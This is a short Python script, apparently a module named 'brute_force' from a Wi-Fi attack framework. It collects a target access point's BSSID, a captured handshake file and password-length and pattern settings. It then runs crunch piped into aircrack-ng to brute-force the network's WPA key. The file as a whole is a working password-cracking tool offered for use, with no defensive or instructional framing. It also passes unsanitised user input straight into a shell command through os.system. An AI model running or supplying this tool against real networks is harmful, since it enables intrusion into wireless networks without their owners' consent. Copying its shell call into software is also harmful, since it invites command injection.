#!/usr/bin/env python3

# wsf\modules\attacks\brute_force.py

import os
from pystyle import Colors, Colorate

gradient_colors = Colors.red_to_white

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > ")).strip()
if bssid.lower() == "back":
    quit()
print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

handshake = input(Colorate.Horizontal(gradient_colors, "wsf (Handshake) > ")).strip()
if handshake.lower() == "back":
    quit()
print(Colorate.Horizontal(gradient_colors, f"Handshake => {handshake}"))

channel_str = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > ")).strip()
if channel_str.lower() == "back":
    quit()

try:
    channel = int(channel_str)
except ValueError:
    quit()

print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

min_len_str = input(Colorate.Horizontal(gradient_colors, "wsf (Minimum) > ")).strip()
if min_len_str.lower() == "back":
    quit()

max_len_str = input(Colorate.Horizontal(gradient_colors, "wsf (Maximum) > ")).strip()
if max_len_str.lower() == "back":
    quit()

try:
    min_len = int(min_len_str)
    max_len = int(max_len_str)
except ValueError:
    quit()

pattern = input(Colorate.Horizontal(gradient_colors, "wsf (Pattern) > ")).strip()
if pattern.lower() == "back":
    quit()

print(Colorate.Horizontal(gradient_colors, f"Pattern => {pattern}"))

os.system(
    f"crunch {min_len} {max_len} {pattern} | aircrack-ng -b {bssid} {handshake}"
)
